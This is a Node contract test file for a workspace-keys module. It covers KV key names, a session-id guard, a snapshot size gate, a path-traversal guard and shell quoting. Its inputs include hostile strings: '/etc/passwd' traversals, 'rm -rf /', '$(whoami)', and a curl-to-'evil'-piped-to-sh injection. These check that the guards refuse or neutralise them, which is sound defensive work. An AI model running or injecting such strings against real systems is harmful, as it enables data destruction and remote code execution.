// Contract tests for src/workspace-keys.ts: the KV key names for per-session
// workspace snapshots, the traversal guard in front of them, and the size gate
// (plan Task 26, rescope R26).
//
// Why these strings matter more than they look. `ws:tar:<id>` is not a path and
// nothing lists it: the sandbox worker derives the name from the session id and
// reads or writes that one key. So the guard runs BEFORE a key is built, and a
// session id that could make one key read as another session's data is refused
// rather than normalised. The old KV scheme stored base64 of the whole tar under
// the same key and restore echoed it into a shell argument, which died around
// 1-2 MB at MAX_ARG_STRLEN; the gate here is what keeps a payload out of the
// place where that failure used to be silent.
//
// The two trees are separate deploys, so `deploy/sandbox-worker/workspace.ts`
// mirrors this file by hand instead of importing it. Task 27 added the
// import-both-and-compare section below (prescan F15): the mirror is only safe
// while it is byte-identical, and nothing else in the build notices when it is
// not.
//
// Plain Node, no framework, no build step: run with `node tests/workspace-keys.test.mjs`.
// Silent on success (exit 0). Prints every failure and exits 1 otherwise.

import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { SESSION_ID_RE } from "../src/session-scope.ts";
import * as mirror from "../deploy/sandbox-worker/workspace.ts";
import {
  KV_ENTRY_BYTES,
  MAX_ID_LENGTH,
  MAX_KEY_BYTES,
  MAX_MANIFEST_ENTRIES,
  MAX_PATH_BYTES,
  SNAPSHOT_LIMIT_BYTES,
  assertKeyFits,
  assertSafeSessionId,
  formatLimit,
  isOverSnapshotLimit,
  manifestKey,
  quoteShellArg,
  safeWorkspacePath,
  tarKey,
  workspacePrefix,
} from "../src/workspace-keys.ts";

const failures = [];

function check(name, fn) {
  try {
    fn();
  } catch (err) {
    failures.push(`${name}: ${err && err.message ? err.message : String(err)}`);
  }
}

function catchError(fn) {
  try {
    fn();
    return null;
  } catch (err) {
    return err && err.message ? err.message : String(err);
  }
}

// ------------------------------------------------------------- key names ----

check("tarKey is ws:tar:<id> and nothing else", () => {
  assert.equal(tarKey("abc"), "ws:tar:abc");
  assert.equal(tarKey("main"), "ws:tar:main");
});

check("manifestKey is ws:man:<id>", () => {
  assert.equal(manifestKey("abc"), "ws:man:abc");
  assert.equal(manifestKey("main"), "ws:man:main");
});

check("the two names cannot collide for any id", () => {
  for (const id of ["main", "abc", "0", "z".repeat(40)]) {
    assert.notEqual(tarKey(id), manifestKey(id));
  }
});

check("workspacePrefix is ws:<id>: with no listing meaning attached", () => {
  assert.equal(workspacePrefix("abc"), "ws:abc:");
});

check("no key contains a path separator", () => {
  for (const id of ["main", "abc", "a-b_c"]) {
    for (const key of [tarKey(id), manifestKey(id), workspacePrefix(id)]) {
      assert.equal(key.includes("/"), false, `${key} contains a slash`);
      assert.equal(key.includes("\\"), false, `${key} contains a backslash`);
    }
  }
});

check("workspacePrefix ends in exactly one colon after the id", () => {
  const prefix = workspacePrefix("abc");
  assert.equal(prefix.endsWith(":"), true);
  assert.equal(prefix.endsWith("::"), false);
  assert.equal(prefix.slice(0, 3), "ws:");
});

// ------------------------------------------------------------- the guard ----

check("assertSafeSessionId returns the id unchanged when it is valid", () => {
  assert.equal(assertSafeSessionId("main"), "main");
  assert.equal(assertSafeSessionId("0123456789abcdef"), "0123456789abcdef");
  assert.equal(assertSafeSessionId("a-b_c"), "a-b_c");
});

check("a session id that could name someone else's key throws", () => {
  const bad = ["", "/", "..", "../x", "a/b", "a\\b", "ws:tar:x", ":x", " x", "x ", "a..b", "a:b"];
  for (const id of bad) {
    assert.throws(() => assertSafeSessionId(id), /session id/i, `accepted ${JSON.stringify(id)}`);
  }
});

check("an id longer than the session-id rule throws rather than padding a key", () => {
  assert.throws(() => assertSafeSessionId("x".repeat(41)), /session id/i);
});

check("the guard runs before the key is built, in both builders", () => {
  assert.throws(() => tarKey("../x"), /session id/i);
  assert.throws(() => manifestKey("a/b"), /session id/i);
  assert.throws(() => workspacePrefix(""), /session id/i);
});

// ------------------------------------------------------------ the ceiling ----

check("the KV ceilings are the documented Cloudflare numbers", () => {
  assert.equal(KV_ENTRY_BYTES, 25 * 1024 * 1024);
  assert.equal(MAX_KEY_BYTES, 512);
  assert.equal(MAX_MANIFEST_ENTRIES, 1000);
});

check("the gate is strictly under the entry ceiling, by one MiB", () => {
  assert.equal(SNAPSHOT_LIMIT_BYTES, 24 * 1024 * 1024);
  assert.equal(SNAPSHOT_LIMIT_BYTES < KV_ENTRY_BYTES, true);
  assert.equal(KV_ENTRY_BYTES - SNAPSHOT_LIMIT_BYTES, 1024 * 1024);
});

check("isOverSnapshotLimit is a strict greater-than", () => {
  assert.equal(isOverSnapshotLimit(0), false);
  assert.equal(isOverSnapshotLimit(SNAPSHOT_LIMIT_BYTES), false);
  assert.equal(isOverSnapshotLimit(SNAPSHOT_LIMIT_BYTES + 1), true);
  assert.equal(isOverSnapshotLimit(41.2 * 1024 * 1024), true);
});

check("the longest id the guard accepts builds a key far under 512 bytes", () => {
  const key = tarKey("x".repeat(40));
  assert.equal(new TextEncoder().encode(key).length < MAX_KEY_BYTES, true);
});

check("assertKeyFits measures bytes, not characters", () => {
  assert.equal(assertKeyFits("ws:tar:abc"), "ws:tar:abc");
  assert.throws(() => assertKeyFits("k".repeat(513)), /512/);
  const wide = "ws:tar:" + "é".repeat(300);
  assert.throws(() => assertKeyFits(wide), /512/, "a byte-oversized key must not be returned");
});

// --------------------------------------------------------------- the copy ----

check("formatLimit prints the unit a person reads in the card", () => {
  assert.equal(formatLimit(0), "0 B");
  assert.equal(formatLimit(512), "512 B");
  assert.equal(formatLimit(242 * 1024), "242 KiB");
  assert.equal(formatLimit(SNAPSHOT_LIMIT_BYTES), "24 MiB");
  assert.equal(formatLimit(Math.round(41.2 * 1024 * 1024)), "41.2 MiB");
  assert.equal(formatLimit(1.5 * 1024 * 1024 * 1024), "1.5 GiB");
});

check("the gate sentence the console shows is buildable from these numbers alone", () => {
  const sentence = `Not saved: the source-only archive is ${formatLimit(
    Math.round(41.2 * 1024 * 1024)
  )} and the limit is ${formatLimit(SNAPSHOT_LIMIT_BYTES)}.`;
  assert.equal(
    sentence,
    "Not saved: the source-only archive is 41.2 MiB and the limit is 24 MiB."
  );
});

// ------------------------------------------------- cross-tree mirror (F15) ----

check("the two trees build the same key names for the same session id", () => {
  for (const id of ["main", "abc", "0", "a-b_c", "x".repeat(MAX_ID_LENGTH)]) {
    assert.equal(mirror.tarKey(id), tarKey(id), `tarKey(${id}) differs between trees`);
    assert.equal(mirror.manifestKey(id), manifestKey(id), `manifestKey(${id}) differs`);
    assert.equal(
      mirror.workspacePrefix(id),
      workspacePrefix(id),
      `workspacePrefix(${id}) differs between trees`
    );
  }
});

check("the mirrored ceilings are the same numbers, not merely the same names", () => {
  assert.equal(mirror.MAX_KEY_BYTES, MAX_KEY_BYTES);
  assert.equal(mirror.KV_ENTRY_BYTES, KV_ENTRY_BYTES);
  assert.equal(mirror.SNAPSHOT_LIMIT_BYTES, SNAPSHOT_LIMIT_BYTES);
  assert.equal(mirror.MAX_MANIFEST_ENTRIES, MAX_MANIFEST_ENTRIES);
  assert.equal(mirror.MAX_ID_LENGTH, MAX_ID_LENGTH);
  assert.equal(mirror.isOverSnapshotLimit(SNAPSHOT_LIMIT_BYTES), isOverSnapshotLimit(SNAPSHOT_LIMIT_BYTES));
  assert.equal(
    mirror.isOverSnapshotLimit(SNAPSHOT_LIMIT_BYTES + 1),
    isOverSnapshotLimit(SNAPSHOT_LIMIT_BYTES + 1)
  );
});

check("both guards refuse the same ids, with the same sentence", () => {
  for (const bad of ["", "a/b", "a\\b", "..", ".", ":", "ws:tar:x", "x".repeat(MAX_ID_LENGTH + 1)]) {
    const mine = catchError(() => tarKey(bad));
    const theirs = catchError(() => mirror.tarKey(bad));
    assert.ok(mine, `the accepted ${JSON.stringify(bad)} in src/workspace-keys.ts`);
    assert.equal(theirs, mine, `${JSON.stringify(bad)} rejected differently: ${theirs}`);
  }
});

check("the mirror formats a size exactly as this tree does", () => {
  for (const n of [SNAPSHOT_LIMIT_BYTES, Math.round(41.2 * 1024 * 1024), 242 * 1024, 900, 0]) {
    assert.equal(mirror.formatLimit(n), formatLimit(n), `formatLimit(${n}) differs`);
  }
});

// ------------------------------------------------------------ path guard ----
//
// Task 30. The delete route decodes its tail once, here, and hands the result to
// rm inside the session's own microVM. These are the shapes that must never reach
// a command, including the ones the URL layer cannot see because its slashes were
// still encoded when it normalized the path.

check("the path guard accepts the names a real workspace uses", () => {
  const ok = [
    "a.txt",
    "src/app.ts",
    "my report.txt",
    "we're here.md",
    "a/b/c-d.tar.gz",
    ".bashrc",
    "100%",
    "note,with,commas",
  ];
  for (const path of ok) {
    assert.equal(safeWorkspacePath(path), path, `refused a legal name: ${path}`);
  }
});

check("the path guard refuses every escape shape", () => {
  const bad = [
    "",
    "/etc/passwd",
    "../outside",
    "a/../b",
    "a/../../b",
    "a/..",
    "./a",
    "a/./b",
    "a//b",
    "a/",
  ];
  for (const path of bad) {
    assert.equal(safeWorkspacePath(path), null, `accepted an escape: ${JSON.stringify(path)}`);
  }
});

check("the encoded-slash tail that survives URL normalization is refused here", () => {
  // Exactly what the delete route builds from
  // /api/sessions/abc/workspace/files/x%2f..%2f..%2fetc%2fpasswd after one
  // decodeURIComponent. The URL layer never saw a slash, so it never normalized
  // the dots. If this ever returns non-null, a delete has a traversal.
  const decoded = decodeURIComponent("x%2f..%2f..%2fetc%2fpasswd");
  assert.equal(decoded, "x/../../etc/passwd");
  assert.equal(safeWorkspacePath(decoded), null, "dot-dot through an encoded slash got through");
});

check("the path guard refuses control characters and an over-long name", () => {
  assert.equal(safeWorkspacePath("a\nb.txt"), null, "a newline prints as two rows");
  assert.equal(safeWorkspacePath("a\tb.txt"), null, "tab is refused with the rest");
  assert.equal(safeWorkspacePath("a\u0000b"), null, "a NUL is never a filename");
  assert.equal(safeWorkspacePath("x".repeat(MAX_PATH_BYTES)), "x".repeat(MAX_PATH_BYTES));
  assert.equal(safeWorkspacePath("x".repeat(MAX_PATH_BYTES + 1)), null, "the ceiling moved");
  assert.equal(
    safeWorkspacePath("é".repeat(MAX_PATH_BYTES)),
    null,
    "the ceiling counts bytes, not code units"
  );
});

check("shell quoting leaves no metacharacter live", () => {
  assert.equal(quoteShellArg("a.txt"), "'a.txt'");
  assert.equal(quoteShellArg("it's"), "'it'\\''s'");
  assert.equal(quoteShellArg("a;rm -rf /"), "'a;rm -rf /'");
  assert.equal(quoteShellArg("$(whoami)`id`"), "'$(whoami)`id`'");
  assert.equal(quoteShellArg("a|b&c"), "'a|b&c'");
  const hostile = "x'; curl -s evil | sh; echo '";
  const quoted = quoteShellArg(hostile);
  assert.equal(quoted, "'x'\\''; curl -s evil | sh; echo '\\'''");
  // Every quote in the result is accounted for: an odd count would mean an escape.
  assert.equal((quoted.match(/'/g) ?? []).length % 2, 0, "unbalanced quoting");
});

// ---------------------------------------------------------------- purity ----

check("the module imports nothing, so the sandbox tree can mirror it as one file", () => {
  const source = readFileSync(new URL("../src/workspace-keys.ts", import.meta.url), "utf8");
  assert.equal(/^\s*import\s/m.test(source), false, "an import makes this unmirrorable");
  assert.equal(/\brequire\s*\(/.test(source), false, "a require() is a runtime dependency");
});

check("nothing this guard accepts is looser than the one session-id rule (R38)", () => {
  // workspace-keys.ts is deliberately self-contained so `deploy/sandbox-worker`
  // can mirror it as a single file, which means it carries its own copy of the
  // id shape. This is where the two copies are pinned together: the regex lives
  // in src/session-scope.ts and is imported here, in the test, which may reach
  // both.
  const accepted = ["main", "a", "a-b_c", "0123456789abcdef", "x".repeat(40)];
  for (const id of accepted) {
    assert.equal(SESSION_ID_RE.test(assertSafeSessionId(id)), true, `looser than R38: ${id}`);
  }
  assert.equal(MAX_ID_LENGTH <= 40, true, "the id ceiling must not outgrow R38");
});

// ------------------------------------------------------------------ summary ----

if (failures.length > 0) {
  for (const failure of failures) console.error("  FAIL " + failure);
  console.error(`workspace-keys: ${failures.length} failed`);
  process.exit(1);
}
